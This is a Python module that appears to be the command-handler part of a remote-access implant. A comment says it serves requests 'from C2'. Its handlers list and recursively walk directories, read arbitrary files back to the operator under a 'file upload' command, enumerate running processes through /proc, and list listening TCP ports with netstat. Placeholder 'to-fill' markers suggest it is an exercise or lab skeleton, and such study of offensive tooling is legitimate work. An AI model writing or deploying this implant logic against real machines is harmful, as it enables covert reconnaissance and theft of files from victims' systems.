import os
import subprocess
from protocol.common import *


#  agent command definitions will appear here.


# todo: #to-fill
def handle_command(command_id, arguments):
    print(f"[+] Trying to run command handler for command {command_id}")
    if command_id not in command_id_to_command_handler:
        print(f"[-] Command {command_id} is not supported by agent")
        return MESSAGE_STATUS_ERROR, f"[-] {command_id} is not supported by agent"

    payload_handler = command_id_to_command_handler[command_id]
    if arguments:
        return payload_handler(arguments)
    else:
        return payload_handler()


def decode_path(path):
    # listing the path's files and directories (not recursive)
    if isinstance(path, bytes):
        path = path.decode()

    return path

def list_dir(path):
    # listing the path's files and directories (not recursive)
    path = decode_path(path)
    if not os.path.isdir(path):
        return MESSAGE_STATUS_ERROR, f"ListDir error from agent: path '{path}' doesn't exist locally"

    response = f"* ListDir path: '{path}' *\n\n"
    files = os.listdir(path)
    for file in files:
        full_path = os.path.join(path, file)
        if os.path.isfile(full_path):
            response += f"[F]\t{file}\n"
        elif os.path.isdir(full_path):
            response += f"[D]\t{file}\n"
        else:
            response += f"[O]\t{file}\n"

    response += "\n*ListDir End*\n"
    return MESSAGE_STATUS_OK, response


def walk_dir(path):
    # listing the path's files and directories (recursive)
    path = decode_path(path)
    if not os.path.isdir(path):
        return MESSAGE_STATUS_ERROR, f"WalkDir error from agent: path '{path}' doesn't exist locally"

    response = f"* WalkDir path: '{path}' *\n\n"
    # Walk through the directory and its subdirectories
    for dirpath, dirnames, filenames in os.walk(path):
        depth = dirpath.replace(path, "").count(os.sep)
        indent = "\t" * depth  # Indentation based on depth
        #  current directory
        response += f"{indent}[D] {os.path.basename(dirpath) or '.'}\n"
        for dirname in dirnames:
            response += f"{indent}\t[D] {dirname}\n"
        for filename in filenames:
            response += f"{indent}\t[F] {filename}\n"

    response += "\n*WalkDir End*\n"
    return MESSAGE_STATUS_OK, response

def read_file(path):
    if not os.path.isfile(path):
        return MESSAGE_STATUS_ERROR, f"File upload error from agent: path '{path}' doesn't exist locally"

    with open(path, "rb") as f:
        response = f.read()

    return MESSAGE_STATUS_OK, response

def list_running_processes():
    # Define column widths
    pid_w = 10
    name_w = 45
    status_w = 10
    memory_w = 12
    cpu_w = 8
    error_w = 15

    response = f"* Running Processes: *\n\n"
    response += f"{'PID':<{pid_w}} {'Name':<{name_w}} {'Status':<{status_w}} {'Memory (MB)':<{memory_w}} {'CPU (%)':<{cpu_w}} {'Error':<{error_w}}\n"
    response += f"{'-' * 90}\n"

    # Iterate over all process directories in /proc
    for pid in os.listdir('/proc'):
        if pid.isdigit():
            try:
                pid = int(pid)
                # Read process name from /proc/[pid]/comm
                with open(f'/proc/{pid}/comm', 'r') as comm_file:
                    name = comm_file.read().strip()

                # Read process status from /proc/[pid]/status
                with open(f'/proc/{pid}/status', 'r') as status_file:
                    status = ''
                    memory = 0
                    for line in status_file:
                        if line.startswith('State:'):
                            status = line.split()[1]
                        elif line.startswith('VmRSS:'):
                            # Convert memory from kB to MB
                            memory = int(line.split()[1]) / 1024

                # Read CPU usage from /proc/[pid]/stat
                with open(f'/proc/{pid}/stat', 'r') as stat_file:
                    stat = stat_file.read().split()
                    # utime + stime (user and kernel mode time)
                    utime = int(stat[13])
                    stime = int(stat[14])
                    # Compute total CPU usage as a sum of utime and stime
                    cpu = (utime + stime) / os.sysconf(os.sysconf_names['SC_CLK_TCK'])

                response += f"{pid:<{pid_w}} {name:<{name_w}} {status:<{status_w}} {memory:<{memory_w}.2f} {cpu:<{cpu_w}.2f} {'':<{error_w}}\n"
            except FileNotFoundError:
                # Handle cases where the process no longer exists
                response += f"{pid:<{pid_w}} {'<NoSuchProcess>':<{name_w}} {'n/a':<{status_w}} {'n/a':<{memory_w}} {'n/a':<{cpu_w}} {pid:<{error_w}}\n"
            except PermissionError:
                # Handle processes where access is denied
                response += f"{pid:<{pid_w}} {'<AccessDenied>':<{name_w}} {'n/a':<{status_w}} {'n/a':<{memory_w}} {'n/a':<{cpu_w}} {pid:<{error_w}}\n"
            except Exception as e:
                # Handle any other exceptions
                response += f"{pid:<{pid_w}} {'<Error>':<{name_w}} {'n/a':<{status_w}} {'n/a':<{memory_w}} {'n/a':<{cpu_w}} {str(e):<{error_w}}\n"

    response += "\n*Running Processes*\n"
    return MESSAGE_STATUS_OK, response


def list_listening_tcp_ports():
    # Will list listening TCP ports and their processes
    response = f"* Listening TCP ports: *\n\n"
    result = subprocess.run(['netstat', '-ltnp'], capture_output=True, text=True)
    response += result.stdout
    response += "\n*Listening TCP ports*\n"
    return MESSAGE_STATUS_OK, response


# functions to handle the command request from C2
# receive arguments
# returns command_status, command_response
command_id_to_command_handler = {
    LISTDIR_COMMAND_ID: list_dir,
    WALKDIR_COMMAND_ID: walk_dir,
    RUNNING_PROCESSES_COMMAND_ID: list_running_processes,
    FILE_UPLOAD_COMMAND_ID: read_file,
    NETWORK_CONNECTIONS_COMMAND_ID: list_listening_tcp_ports,
}

# todo: #to-fill